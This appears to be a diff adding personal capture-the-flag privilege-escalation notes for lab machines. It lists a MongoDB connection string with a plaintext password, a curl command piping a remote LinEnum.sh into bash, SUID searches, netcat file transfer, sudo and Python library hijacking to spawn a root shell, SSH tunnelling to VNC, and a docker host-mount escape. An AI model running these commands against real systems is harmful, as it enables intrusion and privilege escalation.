@@ -1,0 +1,27 @@
+--- /var/sheduler/app.js
+
+--- 'mongodb://mark:5AYRft73VtFpc84k@localhost:27017/scheduler?authMechanism=DEFAULT&authSource=scheduler'    #connect with database and create a document
+--- mongo -p -u mark scheduler
+--- curl 10.10.10.58:8000/LinEnum.sh | bash
+--- find / -perm -4000 2>/dev/null      or   find / -perm -u=s 2>/dev/null
+--- to get /usr/local/bin/backup
+--- nc 10.10.14.5 8888 < backup    #use to send
+--- nc -lvnp 8888 > backup         #use to receive
+--- find /home -type f -printf "%f\t%p\t%u\t%g\t%m\n" 2>/dev/null
+---  sudo -u scriptmanager cp /tmp/root.py /scripts/test.py    #if user have NOPASSWD   permission
+--- learn vnviewer to connect with ssh in privesc
+--- ssh tunneling    -- ssh -L 5901:127.0.0.1:5901 charix@10.10.10.84
+                     -- vncviewer -passwd secret 127.0.0.1:5901
+
+
+
+
+---echo 'import os;os.system("/bin/bash")' > hashlib.py
+   sudo /usr/bin/python /home/richard/test.py
+
+
+
+
+---id    (We can change docker container)
+   docker run -ti olympia bash   
+   docker run -v /:/mnt/dgsh -ti olympia bash
